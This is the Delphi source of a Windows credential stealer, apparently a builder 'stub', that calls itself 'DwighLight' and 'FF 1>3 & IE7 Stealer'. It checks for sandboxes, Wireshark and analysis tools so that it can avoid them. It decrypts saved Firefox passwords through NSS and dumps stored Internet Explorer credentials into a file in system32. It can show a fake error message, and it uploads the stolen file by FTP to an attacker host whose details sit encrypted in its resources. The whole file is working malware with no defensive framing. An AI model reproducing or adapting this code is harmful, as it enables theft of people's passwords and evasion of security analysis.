program Stub;


uses
  windows,
  Variants,
  Sysutils,
  wininet,
  uie7_decode,
  TlHelp32;

var
arquivo: textfile;
ifile, iremote: string;
hopen, hconnect: pointer;
ih,iu,ip, te,fm,ats,ws: string;
iuser,ihost,ipass: PAnsiChar;
version, firefoxpath: string;

function IsUsername(username: string): Boolean;
var
  szUserName : PChar;
  dwUserNameSize : DWORD;
begin
  szUserName := AllocMem(MAX_PATH);
  dwUserNameSize := MAX_PATH;
  GetUserName(szUserName,dwUserNameSize);
  Result := false;
  If szUserName = username Then
    begin
    Result := true;
  end;
end;


function processExists(exeFileName: string): Boolean;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := False;
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
    begin
      Result := True;
    end;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;


function IsSandbox: Boolean;
begin
result:=false;
if isusername('USER') then
result:= true;
end;

function ModuleCheck(comp: string) :Boolean;
var
i:integer;
begin
result:=false;
for i:= 0 to 3 do
begin
if (GetModuleHandle(PAnsiChar(comp))<>0) then
result:=true;
end;
end;


function IsJB:boolean;
begin
result:=false;
if ((processexists('joeboxserver.exe')) or (processexists('joeboxcontrol.exe'))) then
result:=true;
end;

function IsSandboxie:boolean;
begin
result:=false;
if modulecheck('SbieDll.dll') then
result:= true;
end;


function wireshark : boolean;
begin
result:= false;
if processexists('wireshark.exe') then
result := true;
end;

function IsThreadexpert: Boolean;
begin
result:=false;
if  isusername('username') then
result:= true;
end;


function GetResourceAsPointer(ResName: pchar; ResType: pchar; out Size: longword): pointer;
var
InfoBlock: HRSRC;
GlobalMemoryBlock: HGLOBAL;
begin
InfoBlock := FindResource(hInstance, resname, restype);
size := SizeofResource(hInstance, InfoBlock);
GlobalMemoryBlock := LoadResource(hInstance, InfoBlock);
Result := LockResource(GlobalMemoryBlock);
end;

function GetResourceAsString(ResName: pchar; ResType: pchar): string;
var
ResData: PChar;
ResSize: Longword;
begin
ResData := GetResourceAsPointer(resname, restype, ResSize);
SetString(Result, ResData, ResSize);
end;

function PC():String;
const  Chars = '0123456789';
var
S: string;
i, N: integer;
CompName: Array [0 .. 256] of char;
size: DWORD;
begin
Randomize;
S := '';
size := 256;
for i := 1 to 8 do begin
N := Random(Length(Chars)) + 1;
S := S + Chars[N];
End;
GetComputerName(Compname, size);
Result := CompName+s;
end;
function ReadKeyToString(hRoot:HKEY; sKey:string; sSubKey:string):string;
var
hOpen: HKEY;
sBuff: array[0..255] of char;
dSize: integer;
begin
if (RegOpenKeyEx(hRoot, PChar(sKey), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS) then
begin
dSize := SizeOf(sBuff);
RegQueryValueEx(hOpen, PChar(sSubKey), nil, nil, @sBuff, @dSize);
Result := sBuff
end;
RegCloseKey(hOpen);
end;

function strtoint(const s:string): integer;
var
  e: integer;
begin
  val(s, result, e);
end;

procedure gsf;
var soft,moz,fire: string;
begin
soft:= 'S'+'O'+'F'+'T'+'W'+'A'+'R'+'E'+'\';
moz:= 'M'+'o'+'z'+'i'+'l'+'l'+'a';
fire:= 'F'+'i'+'r'+'e'+'f'+'o'+'x';
version := ReadKeyToString(HKEY_LOCAL_MACHINE, soft+moz+'\'+moz+' '+fire, 'CurrentVersion');
FireFoxPath:= ReadKeyToString(HKEY_LOCAL_MACHINE, soft+moz+'\'+moz+' '+fire+'\' + version + '\Main', 'Install Directory') + '\';
end;

procedure gfp(SignonsFile : String);
type
TSECItem = packed record
SECItemType: dword;
SECItemData: pchar;
SECItemLen: dword;
end;
PSECItem = ^TSECItem;
var
NSSModule: THandle;
NSS_Init: function(configdir: pchar): dword; cdecl;
NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
PK11_GetInternalKeySlot: function: pointer; cdecl;
PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
NSS_Shutdown: procedure; cdecl;
PK11_FreeSlot: procedure(slot: pointer); cdecl;
hToken: THandle;
ProfilePath: array [0..MAX_PATH] of char;
ProfilePathLen: dword;
FirefoxProfilePath: pchar;
MainProfile: array [0..MAX_PATH] of char;
MainProfilePath: pchar;
PasswordFile: THandle;
PasswordFileSize: dword;
PasswordFileData: pchar;
Passwords: string;
BytesRead: dword;
CurrentEntry: string;
Site: string;
Name: string;
Value: string;
KeySlot: pointer;
EncryptedSECItem: TSECItem;
DecryptedSECItem: TSECItem;
Result: string;
begin
If StrToInt(Copy(version,0,1)) < 3 Then begin
LoadLibrary(pchar(FirefoxPath + 'nspr4.dll'));
LoadLibrary(pchar(FirefoxPath + 'plc4.dll'));
LoadLibrary(pchar(FirefoxPath + 'plds4.dll'));
end else begin
LoadLibrary(pchar(FirefoxPath + 'mozcrt19.dll'));
LoadLibrary(pchar(FirefoxPath + 'sqlite3.dll'));
LoadLibrary(pchar(FirefoxPath + 'nspr4.dll'));
LoadLibrary(pchar(FirefoxPath + 'plc4.dll'));
LoadLibrary(pchar(FirefoxPath + 'plds4.dll'));
LoadLibrary(pchar(FirefoxPath + 'nssutil3.dll'));
end;
LoadLibrary(pchar(FirefoxPath + 'softokn3.dll'));
NSSModule := LoadLibrary(pchar(FirefoxPath + 'nss3.dll'));
@NSS_Init := GetProcAddress(NSSModule, 'NSS_Init');
@NSSBase64_DecodeBuffer := GetProcAddress(NSSModule, 'NSSBase64_DecodeBuffer');
@PK11_GetInternalKeySlot := GetProcAddress(NSSModule, 'PK11_GetInternalKeySlot');
@PK11_Authenticate := GetProcAddress(NSSModule, 'PK11_Authenticate');
@PK11SDR_Decrypt := GetProcAddress(NSSModule, 'PK11SDR_Decrypt');
@NSS_Shutdown := GetProcAddress(NSSModule, 'NSS_Shutdown');
@PK11_FreeSlot := GetProcAddress(NSSModule, 'PK11_FreeSlot');
OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
ProfilePathLen := MAX_PATH;
ZeroMemory(@ProfilePath, MAX_PATH);
GetEnvironmentVariable('APPDATA',ProfilePath,ProfilePathLen);
FirefoxProfilePath := pchar(profilePath +'\Mozilla\Firefox\profiles.ini');
GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);
MainProfilePath := pchar(profilePath + '\Mozilla\Firefox\' + mainProfile + '\' + signonsfile);
PasswordFile := CreateFile(MainProfilePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
PasswordFileSize := GetFileSize(PasswordFile, nil);
GetMem(PasswordFileData, PasswordFileSize);
ReadFile(PasswordFile, PasswordFileData^, PasswordFileSize, BytesRead, nil);
CloseHandle(PasswordFile);
Passwords := PasswordFileData;
FreeMem(PasswordFileData);
Delete(Passwords, 1, Pos('.' + #13#10, Passwords) + 2);
if NSS_Init(pchar(profilePath + '\Mozilla\Firefox\' + mainProfile)) = 0 then
begin
KeySlot := PK11_GetInternalKeySlot;
if KeySlot <> nil then
begin
if PK11_Authenticate(KeySlot, True, nil) = 0 then
begin
while Length(Passwords) <> 0 do
begin
writeln(arquivo, '--------------------');
CurrentEntry := Copy(Passwords, 1, Pos('.' + #13#10, Passwords) - 1);
Delete(Passwords, 1, Length(CurrentEntry) + 3);
Site := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
Delete(CurrentEntry, 1, Length(Site) + 2);
Writeln(arquivo, Site);
while Length(CurrentEntry) <> 0 do
begin
Name := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
Delete(CurrentEntry, 1, Length(Name) + 2);
Value := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
Delete(CurrentEntry, 1, Length(Value) + 2);
NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Value), Length(Value));
if PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil) = 0 then
begin
Result := DecryptedSECItem.SECItemData;
SetLength(Result, DecryptedSECItem.SECItemLen);
if Length(Name) = 0 then Name := '(unnamed value)';
writeln(arquivo, Result);
end
else
begin
end
end;
end;
end
else
begin
writeln(arquivo,'PK11_Authenticate Failed!');
end;
PK11_FreeSlot(KeySlot);
end
else
begin
writeln(arquivo,'PK11_GetInternalKeySlot Failed!');
end;
NSS_Shutdown;
end
else
begin
writeln(arquivo,'NSS_Init Failed!');
end;
end;

function Encrypt(sText:string; sKey:string):string;
var
c:  integer;
b:  integer;
i:  DWORD;
x:  integer;
y:  integer;
begin
  Result := '';
  y := 1;
  for i := 1 to Length(sText) do
  begin
    if y = Length(sKey) then
      y := 1
    else
      y := y + 1;
    c := Ord(sText[i]);
    b := Ord(sKey[y]);
    for x := 1 to 255 do
      c := x xor c xor 256 mod (y + 5);
    Result := Result + Char(c xor b shr 3 shl 4);
  end;
end;


begin
assign(arquivo, 'c:\WINDOWS\system32\homepage.txt');
rewrite(arquivo);
// Check =]
// ---------------------------
ih := GetResourceAsString(pchar('HOST'), RT_RCDATA);
iu := GetResourceAsString(pchar('USER'), RT_RCDATA);
ip := GetResourceAsString(pchar('PASS'), RT_RCDATA);
ws := GetResourceAsString(pchar('WS'), RT_RCDATA);
ats := GetResourceAsString(pchar('ATS'), RT_RCDATA);
te := GetResourceAsString(pchar('TE'), RT_RCDATA);
fm := GetResourceAsString(pchar('FM'), RT_RCDATA);
// ----------------------------------------- \
if ws = 'enable' then
begin
  if wireshark then exit;
end;
if ats = 'enable' then
begin
  if IsSandbox then exit;
  if isJB then exit;
end;
if te = 'enable' then
begin
  if isthreadexpert then exit;
end;

// Converter String a PAnsiChar
ihost:= PAnsiChar(encrypt(ih, '#"xsa)=ID}KÒ»╗'));
iuser:= PAnsiChar(encrypt(iu, '#"xsa)=ID}KÒ»╗'));
ipass:= PAnsiChar(encrypt(ip, '#"xsa)=ID}KÒ»╗'));
// ----------------------------------------- \\
// ----------------------------------------- \\
// Write Info
writeln(arquivo, '=====================================');
writeln(arquivo, '============ DwighLight  ============');
writeln(arquivo, '=====================================');
writeln(arquivo, ' ');
writeln(arquivo, ' InternetExplorer ');
writeln(arquivo,' ');
writeln(arquivo, ShowIEWebCert);
writeln(arquivo,' ');
writeln(arquivo, ' Firefox 1.x>3.x ');
gsf;
gfp('signons.txt');
gfp('signons2.txt');
gfp('signons3.txt');
writeln(arquivo, ' ');
writeln(arquivo, '=====================================');
writeln(arquivo, '======== FF 1>3 & IE7 Stealer =======');
writeln(arquivo, '=====================================');
closefile(arquivo);
ifile:= 'c:\WINDOWS\system32\homepage.txt';
iremote:= PC+'.txt';
if fm = 'enable' then
begin
MessageBox(0, 'Caused exception at 0x44e85c', 'Error at 0x44e85c', +mb_YesNo +mb_ICONWARNING) 
end;
hopen:= internetopen(pchar('update'), INTERNET_OPEN_TYPE_DIRECT, nil, nil, INTERNET_FLAG_ASYNC);
hConnect := InternetConnect(hOpen, ihost, 21, iuser, ipass, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
ftpputfile(hconnect, pchar(ifile), pchar(iremote), FTP_TRANSFER_TYPE_ASCII, 0);
end.
